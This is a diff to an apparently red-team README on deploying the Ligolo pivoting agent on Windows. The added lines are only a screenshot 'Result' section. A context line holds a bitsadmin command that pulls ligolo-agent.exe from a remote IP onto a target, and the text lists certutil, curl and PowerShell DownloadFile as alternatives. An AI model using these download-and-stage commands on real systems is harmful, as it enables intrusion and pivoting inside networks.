@@ -55,6 +55,20 @@ cmd /c bitsadmin /Transfer myJob http://192.168.xxx.xxx/ligolo-agent.exe C:\user
 ```
 Bitsadmin is used as a download method, though it has its pros and cons—such as being deprecated on newer Windows versions and potentially limited by network configurations. Alternatively, certutil can serve as a reliable option for downloading files in many environments. Other flexible methods include curl (available on Windows 10+), or PowerShell’s built-in capability, such as (New-Object System.Net.WebClient).DownloadFile("URL", "path"), which offers compatibility across a wide range of systems.
 
+## 5. Result
+
+### Classic execution
+![image](https://github.com/user-attachments/assets/08d49e56-7398-41e4-ae8d-de22a250cdbe)
+
+![image](https://github.com/user-attachments/assets/abef6ad4-9e40-434c-ae7c-21531a271375)
+
+
+### Using our one liner
+![image](https://github.com/user-attachments/assets/b2302bd1-f0cd-4d54-bc06-c158c185709c)
+
+![image](https://github.com/user-attachments/assets/9121676e-9a5f-4419-91cf-92b2d6693c45)
+
+
 
 ----------------------------------------------------------------------------------------
 
